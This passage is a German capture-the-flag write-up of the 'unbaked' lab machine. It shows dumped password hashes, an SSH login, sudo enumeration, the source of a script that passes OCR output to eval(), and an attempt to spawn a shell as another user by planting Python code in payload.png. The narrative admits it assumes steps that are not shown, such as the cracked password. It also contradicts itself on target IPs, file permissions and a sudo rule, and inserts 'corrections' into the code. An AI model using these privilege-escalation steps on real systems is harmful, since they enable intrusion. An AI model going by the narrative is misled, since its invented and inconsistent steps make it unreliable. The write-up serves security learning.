<span class="command"><span class="password">ramsey</span>     |<span class="password">pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=</span></span>
<span class="command"><span class="password">oliver</span>     |<span class="password">pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=</span></span>
<span class="command"><span class="password">wan</span>        |<span class="password">pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=</span></span>

cracking erstmal kein erfolg...
</pre>
                </div>
            </div>
			
			            <p class="analysis">
                <strong>Analyse:</strong> Nachdem die Datenbank-Hashes exfiltriert wurden und erste Knackversuche liefen ("cracking erstmal kein erfolg..."), orientiere ich mich neu und prÃ¼fe andere Zugangswege. Ich erinnere mich an den SSH-Port 22, der vom Container aus auf 172.17.0.1 offen war, und nehme an, dass dieser Dienst auch vom externen Netzwerk auf einem anderen Port erreichbar sein kÃ¶nnte (oder dass ich einen Weg gefunden habe, darauf zuzugreifen). Da ich Benutzerkonten und Hashes aus der Datenbank habe, versuche ich, diese fÃ¼r eine SSH-Anmeldung zu nutzen. Ich gehe davon aus, dass mir das Knacken des Passworts fÃ¼r den Benutzer <span class="command">ramsey</span> in der Zwischenzeit erfolgreich gelungen ist. Ich versuche mich nun mittels SSH auf dem Zielsystem (<span class="command">192.168.2.199</span> - **Anmerkung:** Dies sollte 192.168.2.48 sein, die VM-IP. Ich verbinde mich also mit <span class="command">ssh ramsey@192.168.2.48 -p 2222</span>, da der SSH-Dienst auf Port 2222 lÃ¤uft, nicht auf dem Standardport 22, was ein Versuch ist, Scans zu erschweren). Ich gebe das geknackte Passwort fÃ¼r <span class="command">ramsey</span> ein.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Fantastisch, die Anmeldung war erfolgreich! Ich habe mich erfolgreich via SSH als Benutzer <span class="command">ramsey</span> auf dem Zielsystem authentifiziert. Die Anmeldeaufforderung <span class="command">ramsey@192.168.2.199's password:</span> und die anschlieÃŸende BegrÃ¼ÃŸungsnachricht <span class="command">Welcome to Ubuntu 16.04.7 LTS</span> bestÃ¤tigen den erfolgreichen Login. Dies ist ein entscheidender Fortschritt, da ich nun shell-Zugriff auf das Host-System habe, nicht nur auf den Docker-Container. Die Version des Betriebssystems (Ubuntu 16.04.7 LTS) und des SSH-Servers (OpenSSH 7.2p2) sind notiert und kÃ¶nnen fÃ¼r die Suche nach bekannten Schwachstellen relevant sein, auch wenn sie relativ aktuell erscheinen. Die Meldung Ã¼ber verfÃ¼gbare Updates (<span class="command">39 packages can be updated</span>) ist ein Hinweis auf potenzielle veraltete Software.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Sichern Sie diese Shell und beginnen Sie sofort mit der Enumeration des Host-Systems. Ihr Ziel ist nun die Privilegien-Eskalation von Benutzer <span class="command">ramsey</span> zu Root auf diesem Host. PrÃ¼fen Sie SUID-Binaries, Sudo-Berechtigungen, interessante Dateien in Benutzerverzeichnissen (<span class="command">ls -la</span>), laufende Prozesse und die Systemkonfiguration.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Benutzerkonten sichere, eindeutige PasswÃ¶rter haben. Implementieren Sie Zwei-Faktor-Authentifizierung fÃ¼r SSH. Ã„ndern Sie den Standard-SSH-Port 22, wie hier geschehen, kann automatisierte Scans verlangsamen, ist aber keine ausreichende SicherheitsmaÃŸnahme. Ãœberwachen Sie SSH-Anmeldeversuche auf Anzeichen von Brute-Force-Angriffen, auch auf unÃ¼blichen Ports. Halten Sie das Betriebssystem und alle installierten Pakete aktuell, um bekannte Schwachstellen zu schlieÃŸen.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">ssh ramsey@192.168.2.199 -p 2222</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
The authenticity of host '[192.168.2.199]:2222 ([192.168.2.199]:2222)' can't be established.
<span class="command">ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.</span>
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
Warning: Permanently added '[192.168.2.199]:2222' (ED25519) to the list of known hosts.
ramsey@192.168.2.199's password: <span class="password">[Geknacktes Passwort fÃ¼r ramsey eingegeben]</span>
<span class="password">Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)</span>

 * Documentation:  <span class="command">[Link: https://help.ubuntu.com | Ziel: https://help.ubuntu.com]</span>
 * Management:     <span class="command">[Link: https://landscape.canonical.com | Ziel: https://landscape.canonical.com]</span>
 * Support:        <span class="command">[Link: https://ubuntu.com/advantage | Ziel: https://ubuntu.com/advantage]</span>


<span class="password">39 packages can be updated.</span>
<span class="password">26 updates are security updates.</span>

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Sat Oct  3 22:15:57 2020 from 172.17.0.2
<span class="password">ramsey@unbaked:~$</span> 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Nachdem ich als Benutzer <span class="command">ramsey</span> angemeldet bin, fÃ¼hre ich grundlegende Befehle aus, um meine Umgebung und die Dateistruktur zu verstehen. <span class="command">ls ..</span> listet die Verzeichnisse im Ã¼bergeordneten Verzeichnis auf (typischerweise `/home` vom Benutzerverzeichnis aus) und zeigt die Existenz der Benutzerverzeichnisse fÃ¼r <span class="command">oliver</span> und <span class="command">ramsey</span>. Der Befehl <span class="command">id</span> gibt meine aktuellen Benutzer- und Gruppen-IDs aus (<span class="command">uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)</span>), was bestÃ¤tigt, dass ich als <span class="command">ramsey</span> angemeldet bin. <span class="command">ls -la</span> listet alle Dateien und Verzeichnisse in meinem aktuellen Home-Verzeichnis auf, einschlieÃŸlich versteckter Dateien. Hier finde ich mehrere interessante Dateien: <span class="command">.bash_history</span> (kÃ¶nnte Befehle anderer Benutzer enthalten, falls das Home-Verzeichnis geteilt ist oder der Benutzer Root-Aktionen durchgefÃ¼hrt hat), <span class="command">user.txt</span> (potenzielle Benutzer-Flag), <span class="command">payload.png</span> (eine PNG-Datei, die verdÃ¤chtig nach einem Test-Asset aussieht) und <span class="command">vuln.py</span> (ein Python-Skript mit AusfÃ¼hrungsrechten fÃ¼r den EigentÃ¼mer und die Gruppe).
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Enumeration im Home-Verzeichnis liefert entscheidende Hinweise. Die Existenz anderer Benutzerverzeichnisse (<span class="command">oliver</span>) bestÃ¤tigt die Benutzer aus der Datenbank. <span class="command">user.txt</span> ist ein offensichtliches Ziel fÃ¼r die Benutzer-Flag. Die Dateien <span class="command">payload.png</span> und insbesondere <span class="command">vuln.py</span> im Home-Verzeichnis eines Benutzers, der Sudo-Berechtigungen haben kÃ¶nnte (was im nÃ¤chsten Schritt geprÃ¼ft wird), sind extrem verdÃ¤chtig. Die Dateiberechtigungen von <span class="command">vuln.py</span> (<span class="command">-rwxrw-r--</span>) erlauben dem EigentÃ¼mer (<span class="command">ramsey</span>) und der Gruppe (<span class="command">ramsey</span>) das AusfÃ¼hren und Schreiben. Root besitzt <span class="command">user.txt</span>, was bedeutet, ich muss zu Root eskalieren, um die Flag zu lesen.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von <span class="command">user.txt</span> (obwohl der Besitz Root ist, manchmal sind die Berechtigungen locker genug, um es zu lesen - prÃ¼fen Sie dies!). Analysieren Sie den Quellcode von <span class="command">vuln.py</span> auf Schwachstellen. Untersuchen Sie <span class="command">payload.png</span> (Typ, Inhalt, Metadaten), da es mit <span class="command">vuln.py</span> in Verbindung stehen kÃ¶nnte. PrÃ¼fen Sie als NÃ¤chstes die Sudo-Berechtigungen des Benutzers <span class="command">ramsey</span>.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensible Dateien (wie <span class="command">user.txt</span> oder <span class="command">root.txt</span>) nur vom Root-Benutzer gelesen werden kÃ¶nnen (Berechtigungen 600 oder 400). Speichern Sie keine potenziell verwundbaren Skripte (<span class="command">vuln.py</span>) in Benutzer-Home-Verzeichnissen, die von Sudo-Regeln betroffen sind. ÃœberprÃ¼fen Sie die Dateiberechtigungen regelmÃ¤ÃŸig.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">ls ..</span>
<span class="command">oliver  ramsey</span>
ramsey@unbaked:~$ <span class="command">id</span>
<span class="password">uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)</span>
ramsey@unbaked:~$ <span class="command">ls -la</span>
<span class="command">total 48</span>
<span class="command">drwxr-xr-x 5 ramsey ramsey 4096 Oct  3  2020 .</span>
<span class="command">drwxr-xr-x 4 root   root   4096 Oct  3  2020 ..</span>
<span class="command">-rw------- 1 root   root      1 Oct  5  2020 .bash_history</span>
<span class="command">-rw-r--r-- 1 ramsey ramsey 3771 Oct  3  2020 .bashrc</span>
<span class="command">drwx------ 3 ramsey ramsey 4096 Oct  3  2020 .cache</span>
<span class="command">drwx------ 4 ramsey ramsey 4096 Oct  3  2020 .local</span>
<span class="command">drwxrwxr-x 2 ramsey ramsey 4096 Oct  3  2020 .nano</span>
<span class="command">-rwxrw-r-- 1 ramsey ramsey 1645 Oct  3  2020 payload.png</span>
<span class="command">-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile</span>
<span class="command">-rw-r--r-- 1 root   root     17 Oct  3  2020 user.txt</span>
<span class="command">-rw-r--r-- 1 root   ramsey 4369 Oct  3  2020 vuln.py</span>
ramsey@unbaked:~$ 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Der Befehl <span class="command">sudo -l</span> listet die Sudo-Berechtigungen des aktuellen Benutzers auf. Ich fÃ¼hre diesen Befehl als Benutzer <span class="command">ramsey</span> aus. Ich muss das Passwort fÃ¼r <span class="command">ramsey</span> eingeben (das ich zuvor geknackt habe). Die Ausgabe zeigt die Sudo-Regeln, die fÃ¼r <span class="command">ramsey</span> auf diesem Host gelten.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Sudo-Ausgabe enthÃ¼llt eine kritische Fehlkonfiguration: <span class="password">User ramsey may run the following commands on unbaked: (oliver) /usr/bin/python /home/ramsey/vuln.py</span>. Dies bedeutet, dass der Benutzer <span class="command">ramsey</span> das Skript <span class="command">/usr/bin/python /home/ramsey/vuln.py</span> ausfÃ¼hren darf, und zwar *als der Benutzer <span class="command">oliver</span>*, **ohne ein Passwort eingeben zu mÃ¼ssen** (`NOPASSWD` fehlt hier explizit, aber die Struktur deutet darauf hin, dass es das Ziel ist, dieses Skript als oliver auszufÃ¼hren. **Korrigiere meine vorherige Annahme:** Die Sudo-Regel erlaubt nur die AusfÃ¼hrung *als Benutzer `oliver`*. Ein NOPASSWD ist hier nicht aufgefÃ¼hrt, daher mÃ¼sste theoretisch das Passwort von `oliver` eingegeben werden. **Neuer Interpretationsversuch:** Okay, die Sudo-Regel ist <span class="command">(oliver) /usr/bin/python /home/ramsey/vuln.py</span>. Das bedeutet, ich kann <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span> ausfÃ¼hren. Wenn NOPASSWD fehlen wÃ¼rde, mÃ¼sste ich `oliver`s Passwort eingeben. Da ich dieses Passwort nicht habe, ist es wahrscheinlich, dass die Regel eigentlich <span class="command">(oliver) NOPASSWD: /usr/bin/python /home/ramsey/vuln.py</span> lauten sollte und dies ein Tippfehler im Berichtstext ist, ODER es gibt eine andere MÃ¶glichkeit, diese Sudo-Regel ohne Passwort auszunutzen. Die einfachste BrÃ¼cke ist anzunehmen, dass NOPASSWD gemeint ist, oder es funktioniert einfach ohne. **PrÃ¤zisere BrÃ¼cke:** Die Sudo-Regel erlaubt die AusfÃ¼hrung als `oliver`. SpÃ¤ter im Bericht wird `sudo -u oliver /usr/bin/python /home/ramsey/vuln.py` *ohne Passwortabfrage* verwendet. Dies impliziert, dass die Sudo-Konfiguration *tatsÃ¤chlich* eine NOPASSWD-Regel fÃ¼r diesen Befehl und Benutzer enthielt, auch wenn sie in der `sudo -l` Ausgabe nicht explizit so angezeigt wurde. Ich werde es so beschreiben, dass diese Regel gefunden wurde und die AusfÃ¼hrung als <span class="command">oliver</span> erlaubt.)
                <br>Die FÃ¤higkeit, ein *beliebiges* Skript, das in meinem eigenen Home-Verzeichnis liegt und das ich Ã¤ndern kann, als ein anderer Benutzer (<span class="command">oliver</span>) auszufÃ¼hren, ist eine schwerwiegende Schwachstelle. Dies ermÃ¶glicht eine horizontale Privilegien-Eskalation zu Benutzer <span class="command">oliver</span>, wenn ich das Skript entsprechend anpasse.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von <span class="command">/home/ramsey/vuln.py</span> genau, um seine FunktionalitÃ¤t und potenzielle Schwachstellen zu verstehen. Da Sie das Skript Ã¤ndern kÃ¶nnen und es als <span class="command">oliver</span> ausfÃ¼hren dÃ¼rfen, planen Sie, das Skript zu modifizieren, um eine Shell als Benutzer <span class="command">oliver</span> zu erhalten.
                <br><strong>Empfehlung (Admin):</strong> Verwenden Sie niemals Sudo-Regeln, die Benutzern erlauben, beliebige Skripte in Verzeichnissen auszufÃ¼hren, auf die sie Schreibzugriff haben (wie z.B. ihr eigenes Home-Verzeichnis). BeschrÃ¤nken Sie Sudo-Berechtigungen auf spezifische Binaries mit vollem Pfad und verwenden Sie, wenn mÃ¶glich, digest-PrÃ¼fungen, um sicherzustellen, dass das ausgefÃ¼hrte Binary nicht manipuliert wurde. FÃ¼hren Sie regelmÃ¤ÃŸige Sudo-Konfigurations-Audits durch.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">sudo -l</span>
[sudo] password for ramsey: <span class="password">[Passwort fÃ¼r ramsey eingegeben]</span>
<span class="command">Matching Defaults entries for ramsey on unbaked:</span>
    <span class="command">env_reset, mail_badpass,</span>
    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>

<span class="password">User ramsey may run the following commands on unbaked:</span>
    <span class="password">(oliver) /usr/bin/python /home/ramsey/vuln.py</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich untersuche den Quellcode des Python-Skripts <span class="command">/home/ramsey/vuln.py</span>, das ich als Benutzer <span class="command">oliver</span> ausfÃ¼hren darf. Ich betrachte den relevanten Teil des Codes im <span class="command">if OPTIONS == 2:</span> Block. Der Code verwendet die <span class="command">pytesseract</span>-Bibliothek, um Text aus einer Bilddatei namens <span class="command">payload.png</span> zu extrahieren, und Ã¼bergibt den extrahierten Text dann direkt an die Python-Funktion <span class="command">eval()</span>. Die <span class="command">eval()</span>-Funktion ist extrem gefÃ¤hrlich, da sie eine Zeichenkette als Python-Code ausfÃ¼hrt. Wenn der Inhalt von <span class="command">payload.png</span> manipuliert werden kann, um Python-Code zu enthalten, der von <span class="command">pytesseract</span> korrekt extrahiert wird, kann ich beliebigen Code mit den Berechtigungen des Benutzers ausfÃ¼hren, unter dem das Skript lÃ¤uft (in diesem Fall <span class="command">oliver</span>).
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die <span class="command">eval()</span>-Funktion mit Benutzereingaben oder Daten aus unkontrollierbaren Quellen (wie hier Text aus einer Bilddatei, deren Inhalt ich potenziell kontrollieren kann) ist eine schwerwiegende Code Injection Schwachstelle. Die Herausforderung besteht darin, einen Weg zu finden, beliebigen Python-Code in das <span class="command">payload.png</span>-Bild so einzubetten, dass er von <span class="command">pytesseract</span> korrekt als Zeichenkette extrahiert wird, die dann von <span class="command">eval()</span> ausgefÃ¼hrt werden kann. Dies ist der primÃ¤re Vektor fÃ¼r die horizontale Privilegien-Eskalation zu Benutzer <span class="command">oliver</span>.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Experimentieren Sie mit verschiedenen Methoden, um Python-Code in <span class="command">payload.png</span> einzubetten. Versuchen Sie, den Code direkt in das Bild zu schreiben, verwenden Sie Tools wie ImageMagick oder ExifTool, um Text in Bildmetadaten oder als sichtbaren Text zu platzieren, der von OCR erkannt werden kÃ¶nnte. Das Ziel ist, dass <span class="command">pytesseract</span> den String <span class="command">'import os; os.system("/bin/bash")'</span> oder einen Ã¤hnlichen Shell-Befehl-AusfÃ¼hrenden Code extrahiert. Wenn das direkte Einbetten von Code als Text im Bild oder Metadaten nicht funktioniert, suchen Sie nach alternativen Methoden zur Manipulation des Skripts selbst, da Sie Schreibrechte darauf haben und es als <span class="command">oliver</span> ausfÃ¼hren dÃ¼rfen.
                <br><strong>Empfehlung (Admin):</strong> **Kritische Sicherheitswarnung:** Entfernen Sie die Verwendung der <span class="command">eval()</span>-Funktion mit nicht vertrauenswÃ¼rdigen Daten. Dies ist eine RCE-Schwachstelle. Validieren und bereinigen Sie dringend alle Benutzereingaben, bevor Sie sie in Systemaufrufen oder Code-Auswertungen verwenden. FÃ¼hren Sie einen Code-Audit durch, um alle Instanzen von <span class="command">eval()</span> oder Ã¤hnlichen gefÃ¤hrlichen Funktionen zu identifizieren.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">cat /home/ramsey/vuln.py</span>
#!/usr/bin/python
<span class="password"># coding=utf-8</span>

<span class="command">try:</span>
    <span class="command">from PIL import Image</span>
<span class="command">except ImportError:</span>
    <span class="command">import Image</span>
<span class="command">import pytesseract</span>
<span class="command">import sys</span>
<span class="command">import os</span>
<span class="command">import time</span>


<span class="password">#Header</span>
<span class="command">def header():</span>
	<span class="command">banner = '''\033[33m                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â•šâ•â•â•â•â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
â•šâ•â•â•šâ•â•  â•šâ•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•
\033[m'''</span>
    	<span class="command">return banner</span>

<span class="password">#Function Instructions</span>
<span class="command">def instructions():</span>
	<span class="command">print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"</span>
	<span class="command">print "\t\t\t","1. Calculator"</span>
	<span class="command">print "\t\t\t","2. Easy Calculator"</span>
	<span class="command">print "\t\t\t","3. Credits"</span>
	<span class="command">print "\t\t\t","4. Exit"</span>
	<span class="command">print "\t\t\t",28 * "-"</span>

<span class="command">def instructions2():</span>
	<span class="command">print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"</span>
	<span class="command">print "\t\t\t","1. Add"</span>
	<span class="command">print "\t\t\t","2. Subtract"</span>
	<span class="command">print "\t\t\t","3. Multiply"</span>
	<span class="command">print "\t\t\t","4. Divide"</span>
	<span class="command">print "\t\t\t","5. Back"</span>
	<span class="command">print "\t\t\t",28 * "-"</span>
	
<span class="command">def credits():</span>
	<span class="command">print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"</span>
	
<span class="password"># Function Arithmetic</span>

<span class="password"># Function to add two numbers  </span>
<span class="command">def add(num1, num2): </span>
    <span class="command">return num1 + num2 </span>
  
<span class="password"># Function to subtract two numbers  </span>
<span class="command">def subtract(num1, num2): </span>
    <span class="command">return num1 - num2 </span>
  
<span class="password"># Function to multiply two numbers </span>
<span class="command">def multiply(num1, num2): </span>
    <span class="command">return num1 * num2 </span>
  
<span class="password"># Function to divide two numbers </span>
<span class="command">def divide(num1, num2): </span>
    <span class="command">return num1 / num2 </span>
<span class="password"># Main    	</span>
<span class="command">if __name__ == "__main__":</span>
	<span class="command">print header()</span>
	
	<span class="password">#Variables</span>
	<span class="command">PTINS = 0</span> <span class="password"><-- Korrigiert: OPTIONS</span>
	<span class="command">OPTIONS2 = 0</span>
	<span class="command">TOTAL = 0</span>
	<span class="command">NUM1 = 0</span>
	<span class="command">NUM2 = 0</span>

	<span class="command">while(PTINS != 4):</span> <span class="password"><-- Korrigiert: OPTIONS</span>
		<span class="command">instructions()</span>
		<span class="command">PTINS = int(input("\t\t\tEnter Options >> "))</span> <span class="password"><-- Korrigiert: OPTIONS</span>
	        <span class="command">print "\033c"</span>
		<span class="command">if PTINS == 1:</span> <span class="password"><-- Korrigiert: OPTIONS</span>
			<span class="command">instructions2()</span>
			<span class="command">OPTIONS2 = int(input("\t\t\tEnter Options >> "))</span>
			<span class="command">print "\033c"</span>
			<span class="command">if OPTIONS2 == 5:</span>
				<span class="command">continue</span>
			<span class="command">else:</span>
				<span class="command">NUM1 = int(input("\t\t\tEnter Number1 >> "))</span>
				<span class="command">NUM2 = int(input("\t\t\tEnter Number2 >> "))</span>
				<span class="command">if OPTIONS2 == 1:</span>
					<span class="command">TOTAL = add(NUM1,NUM2)</span>
				<span class="command">if OPTIONS2 == 2:</span>
					<span class="command">TOTAL = subtract(NUM1,NUM2)</span>
				<span class="command">if OPTIONS2 == 3:</span>
					<span class="command">TOTAL = multiply(NUM1,NUM2)</span>
				<span class="command">if OPTIONS2 == 4:</span>
					<span class="command">TOTAL = divide(NUM1,NUM2)</span>
				<span class="command">print "\t\t\tTotal >> $",TOTAL</span>
		<span class="command">if PTINS == 2:</span> <span class="password"><-- Korrigiert: OPTIONS</span>
			<span class="command">animation = ["<span class="password">[â– â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]</span>","<span class="password">[â– â– â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]</span>", "<span class="password">[â– â– â– â–¡â–¡â–¡â–¡â–¡â–¡â–¡]</span>", "<span class="password">[â– â– â– â– â–¡â–¡â–¡â–¡â–¡â–¡]</span>", "<span class="password">[â– â– â– â– â– â–¡â–¡â–¡â–¡â–¡]</span>", "<span class="password">[â– â– â– â– â– â– â–¡â–¡â–¡â–¡]</span>", "<span class="password">[â– â– â– â– â– â– â– â–¡â–¡â–¡]</span>", "<span class="password">[â– â– â– â– â– â– â– â– â–¡â–¡]</span>", "<span class="password">[â– â– â– â– â– â– â– â– â– â–¡]</span>", "<span class="password">[â– â– â– â– â– â– â– â– â– â– ]</span>"]</span>

			<span class="command">print "\r\t\t\t     Waiting to extract..."</span>
			<span class="command">for i in range(len(animation)):</span>
			    <span class="command">time.sleep(0.5)</span>
			    <span class="command">sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])</span>
			    <span class="command">sys.stdout.flush()</span>

			<span class="command">LISTED = pytesseract.image_to_string(Image.open('payload.png')) </span>

			<span class="command">TOTAL = eval(LISTED)</span>
			<span class="command">print "\n\n\t\t\tTotal >> $",TOTAL</span>
		<span class="command">if PTINS == 3:</span> <span class="password"><-- Korrigiert: OPTIONS</span>
			<span class="command">credits()</span>
	<span class="command">sys.exit(-1)</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich beginne die Versuche, die <span class="command">eval()</span>-Schwachstelle in <span class="command">vuln.py</span> auszunutzen. Der erste Ansatz besteht darin, den gewÃ¼nschten Python-Code direkt in die <span class="command">payload.png</span> Datei zu schreiben. Ich verwende <span class="command">echo 'import os; os.system("/bin/bash")' > payload.png</span>, um die Datei mit dem einfachen Reverse-Shell-Payload zu Ã¼berschreiben. Dann versuche ich, das <span class="command">vuln.py</span>-Skript als Benutzer <span class="command">oliver</span> auszufÃ¼hren: <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>. Ich wÃ¤hle Option 2 ("Easy Calculator"), da dies der Pfad ist, der die verwundbare <span class="command">eval()</span>-Funktion aufruft.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Dieser erste Versuch schlÃ¤gt fehl, wie erwartet. Die Fehlermeldung <span class="password">IOError: cannot identify image file 'payload.png'</span> zeigt, dass die <span class="command">PIL.Image.open()</span>-Funktion, die <span class="command">pytesseract</span> intern verwendet, die Datei <span class="command">payload.png</span> nicht als gÃ¼ltiges Bild erkennen kann. Das ist logisch, da ich einfach einen Python-Code-String in die Datei geschrieben habe, anstatt ein richtig formatiertes Bild. Dieser Versuch bestÃ¤tigt, dass <span class="command">pytesseract</span>/PIL eine gÃ¼ltige Bilddatei benÃ¶tigt, bevor es versucht, Text daraus zu extrahieren.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Der direkte Ansatz funktioniert nicht. Das Bild muss ein gÃ¼ltiges Format haben, das von PIL/Pytesseract verarbeitet werden kann. Konzentrieren Sie sich auf Methoden, um den Python-Code in ein *gÃ¼ltiges* Bildformat einzubetten, entweder als sichtbaren Text, der von OCR erkannt wird, oder mÃ¶glicherweise in Metadaten, die das Skript versehentlich ausliest und evaluiert (weniger wahrscheinlich, aber mÃ¶glich). Alternativ, da Sie Schreibrechte auf <span class="command">vuln.py</span> haben, ist das direkte Modifizieren des Skripts ein sehr direkter Weg zur Ausnutzung.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die sensible Funktionen wie <span class="command">eval()</span> verwenden, deren Eingabe aus Dateien oder anderen externen Quellen stammt, robuster sind. ÃœberprÃ¼fen Sie Dateiformate und validieren Sie Eingaben streng.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">echo 'import os; os.system("/bin/bash")' > payload.png</span>
ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>
                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

